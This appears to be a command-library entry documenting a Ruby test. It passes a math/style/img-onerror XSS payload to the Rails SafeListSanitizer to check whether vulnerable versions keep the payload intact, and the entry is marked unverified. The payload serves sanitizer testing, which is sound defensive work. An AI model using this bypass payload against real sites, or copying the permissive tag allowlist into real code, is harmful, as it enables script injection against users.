---
id: cmd-test-math-xss
data: >-
  Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x
  onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
tags:
  - xss
  - test
type: command
output: '"<math><style><img src=x onerror=alert(1)></style></math>"'
executor: ruby
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:25.744Z'
verified: false
validated: true
submitted: true
---
# test-math-style-xss-payload

## Command

```ruby
Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
```

## Description

Tests sanitizer with math+style payload using img onerror; checks for persistence in vulnerable versions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| tags | ["math", "style"] | Yes |
| input | Payload string | Yes |
| to_s | String conversion | No |

## Examples

### Basic Usage

```ruby
Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
```

## Expected Output

"<math><style><img src=x onerror=alert(1)></style></math>".

## Related

- [[commands/test-svg-style-xss-payload]]
- [[procedures/Verify-XSS-in-Rails-Sanitizer-Using-IRB]]
